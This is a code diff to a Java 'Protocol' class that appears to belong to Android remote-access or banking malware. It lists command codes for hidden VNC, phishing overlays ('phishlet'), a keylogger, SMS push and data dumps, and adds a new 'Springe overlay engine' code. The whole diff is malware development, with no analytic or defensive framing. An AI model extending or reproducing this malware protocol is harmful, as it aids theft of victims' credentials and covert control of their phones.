@@ -22,7 +22,8 @@ public final class Protocol {
     public static final String INFO        = "0xIF";
     public static final String HVNC        = "0xHV";
     public static final String OVERLAY     = "0xOL";
-    public static final String PHISHLET    = "0xPH";
+    public static final String PHISHLET    = "0xPH";  // kept for legacy compat
+    public static final String SPRINGE     = "0xSG";  // new — Springe overlay engine
     public static final String INSPECTOR   = "0xAI";
     public static final String KEYLOGGER   = "0xKL";
     public static final String SMS_PUSH    = "0xSP";
@@ -219,7 +220,7 @@ public final class Protocol {
     public static final String KEY_NOTIF_CHANNEL = "channelId";
     public static final String KEY_NOTIF_ICON    = "iconBase64";
     public static final String KEY_VIBRATE       = "vibrate";
-    // Overlay / Phishlet actions
+    // Springe actions
     public static final String ACT_TRIGGER       = "trigger";
     public static final String ACT_CONFIGURE     = "configure";
     public static final String ACT_DUMP          = "dump";
